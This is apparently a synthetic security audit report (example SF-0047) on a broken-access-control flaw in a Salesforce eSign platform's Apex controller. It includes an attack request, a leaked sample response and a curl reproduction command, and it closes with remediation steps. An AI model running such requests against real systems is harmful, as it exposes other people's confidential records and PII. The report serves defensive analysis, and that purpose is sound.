# Security Analysis Report
**System:** SignFlow eSign Platform (Salesforce-Integrated)
**Domain:** Document Signing / Legal
**Example ID:** SF-0047
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `AccountController.getAccounts` — attacker reads any eSign Account record |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Account Object (Pattern 3.1)

### Summary
The Apex controller `AccountController` on SignFlow eSign Platform (`df454b7e.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `accountId` values it is authorised to access — no server-side enforcement challenges this assumption. An attacker reads any Account record by submitting its ID. In a document signing / legal context, Account records may represent signing party identities, legal entity registrations, and signatory PII.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://df454b7e.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://df454b7e.lightning.force.com/aura
Authorization: Bearer 00DDF454B7E!ARdf454b7e...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DDF454B7E!ARdf454b7e...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"0014B7E","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim eSign Account Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0014B7E", "Name": "Victim Account Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-35-5627"
  }] }, "error": [] }]
}
```

### Evidence Map

| Artifact | Value | Significance |
|---|---|---|
| §4.0 `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 3.1 | Client-assumed authority | Server trusts client-supplied ID |
| §7.0 OWD Account: Private | Sharing config | Only owner should access |
| §8.0 RISK-SF-047 | No `with sharing` | Sharing rules not enforced |
| §8.0 RISK-SF-048 | No ownership predicate | Any `accountId` accepted |
| HAR `accountId` | `0014B7E` | Victim eSign Account record |
| HAR `SensitiveData__c` | `SSN: 000-35-5627` | Signatory / legal entity PII |

### Steps to Reproduce

```bash
SESSION="00DDF454B7E!ARdf454b7e..."
curl -s -X POST "https://df454b7e.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"0014B7E","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Expected (vulnerable): state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-35-5627
# Expected (secure): state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class AccountController { ... }`
2. `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
5. **Document signing note:** Signatory Account records contain legal identity data. SSN exposure (`000-35-5627`) and `internalNotes` access may expose privileged legal communications subject to attorney-client confidentiality obligations.
